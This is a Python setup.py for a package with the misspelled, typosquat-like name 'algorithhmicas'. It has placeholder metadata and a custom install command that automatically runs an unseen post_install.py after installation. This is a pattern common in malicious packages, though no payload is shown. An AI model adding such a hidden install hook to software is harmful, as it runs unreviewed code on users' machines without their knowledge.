import os, sys
from setuptools import setup
from setuptools.command.install import install as _install

def _post_install(dir):
    from subprocess import call
    call([sys.executable, 'post_install.py'], cwd=dir)

class install(_install):
    def run(self):
        _install.run(self)
        self.execute(_post_install, (self.install_lib,),
                     msg="Running post install task")

setup(
    name='algorithhmicas',
    version='5.1',
    author='Your Name',
    author_email='cinnabonwithcinnamon@email.com',
    description='Description of library',
    packages=['algorithhmicas'],
    install_requires=[
        'numpy', 'requests'
    ],
    cmdclass={'install': install},
)